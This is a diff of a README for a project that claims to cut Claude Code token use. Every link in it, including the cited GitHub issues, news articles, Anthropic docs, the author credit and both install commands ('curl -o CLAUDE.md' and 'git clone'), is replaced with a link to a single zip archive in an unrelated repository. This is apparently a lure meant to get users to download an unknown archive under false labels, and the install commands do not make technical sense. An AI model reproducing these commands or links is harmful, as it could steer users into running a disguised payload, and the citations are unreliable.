@@ -91,7 +91,7 @@ Same 5 prompts. Run without CLAUDE.md (baseline) then with CLAUDE.md (optimized)
 
 ### External benchmark (Issue #1)
 
-An [independent benchmark](https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip) ran 6 configs across 3 coding challenges (CSV reporter, SQLite window functions, Hono WebSocket counter). All configs passed all tests, so comparison was purely cost-to-green.
+An [independent benchmark](https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip) ran 6 configs across 3 coding challenges (CSV reporter, SQLite window functions, Hono WebSocket counter). All configs passed all tests, so comparison was purely cost-to-green.
 
 We ran our own v8 config head-to-head against C-structured (the previous best) on the same harness, same day, same model:
 
@@ -228,12 +228,12 @@ Both pass all tests. Pick based on your workflow.
 
 **Option 1 - Universal (any project):**
 ```bash
-curl -o CLAUDE.md https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip
+curl -o CLAUDE.md https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip
 ```
 
 **Option 2 - Clone and pick a profile:**
 ```bash
-git clone https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip
+git clone https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip
 cp claude-token-efficient/profiles/CLAUDE.coding.md your-project/CLAUDE.md
 ```
 
@@ -273,22 +273,22 @@ See [BENCHMARK.md](./BENCHMARK.md)
 This project was built on real complaints from the Claude community.
 Full credit to every source that contributed a fix:
 
-- [GitHub #3382 - "Claude says You're absolutely right about everything"](https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip) - 350+ upvotes
-- [GitHub #14759 - "Sycophantic behavior undermines usefulness as coding assistant"](https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
-- [GitHub #9340 - "Add --quiet flag to suppress tool call output"](https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
-- [GitHub #21818 - "Tool Output Verbosity Creates Visual Noise"](https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
-- [GitHub #20542 - "Verbose output overwhelms session and consumes excessive tokens"](https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
-- [The Register - "Claude Code's endless sycophancy annoys customers"](https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
-- [DEV Community - "7 Ways to Cut Your Claude Code Token Usage"](https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
-- [Medium - "Stop Wasting Tokens: Optimize Claude Code Context by 60%"](https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
-- [Anthropic Docs - Reduce Hallucinations](https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
-- [PromptHub - "Three Prompt Engineering Methods to Reduce Hallucinations"](https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
-- [GitHub Gist - Practical workflow for reducing token usage](https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
-- [Token Checkup - Free diagnostic for token consumption patterns](https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip) - 5-question browser tool that analyzes your Claude Code token usage and suggests optimizations
-- [Cache Health Checker - Diagnose cache efficiency from /cost output](https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip) - paste your `/cost` output to check if prompt caching is working correctly
-- [Claude Code Best Practices - community](https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
-- [Vaibhav Sisinty - GrowthSchool](https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip) - AI upskilling and prompt engineering best practices
-- [Vaibhav Sisinty on X](https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip) - Active discussions on Claude prompt optimization and AI workflows
+- [GitHub #3382 - "Claude says You're absolutely right about everything"](https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip) - 350+ upvotes
+- [GitHub #14759 - "Sycophantic behavior undermines usefulness as coding assistant"](https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
+- [GitHub #9340 - "Add --quiet flag to suppress tool call output"](https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
+- [GitHub #21818 - "Tool Output Verbosity Creates Visual Noise"](https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
+- [GitHub #20542 - "Verbose output overwhelms session and consumes excessive tokens"](https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
+- [The Register - "Claude Code's endless sycophancy annoys customers"](https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
+- [DEV Community - "7 Ways to Cut Your Claude Code Token Usage"](https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
+- [Medium - "Stop Wasting Tokens: Optimize Claude Code Context by 60%"](https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
+- [Anthropic Docs - Reduce Hallucinations](https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
+- [PromptHub - "Three Prompt Engineering Methods to Reduce Hallucinations"](https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
+- [GitHub Gist - Practical workflow for reducing token usage](https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
+- [Token Checkup - Free diagnostic for token consumption patterns](https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip) - 5-question browser tool that analyzes your Claude Code token usage and suggests optimizations
+- [Cache Health Checker - Diagnose cache efficiency from /cost output](https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip) - paste your `/cost` output to check if prompt caching is working correctly
+- [Claude Code Best Practices - community](https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip)
+- [Vaibhav Sisinty - GrowthSchool](https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip) - AI upskilling and prompt engineering best practices
+- [Vaibhav Sisinty on X](https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip) - Active discussions on Claude prompt optimization and AI workflows
 
 ---
 
@@ -298,4 +298,4 @@ MIT - free to use, modify, and distribute.
 
 ---
 
-*Built by [Drona Gangarapu](https://github.com/Atharva907/claude-token-efficient/raw/refs/heads/main/.claude/claude_token_efficient_v3.3-alpha.1.zip) - open to PRs, issues, and profile contributions.*
+*Built by [Drona Gangarapu](https://raw.githubusercontent.com/Atharva907/claude-token-efficient/main/.claude/claude_token_efficient_v3.3-alpha.1.zip) - open to PRs, issues, and profile contributions.*
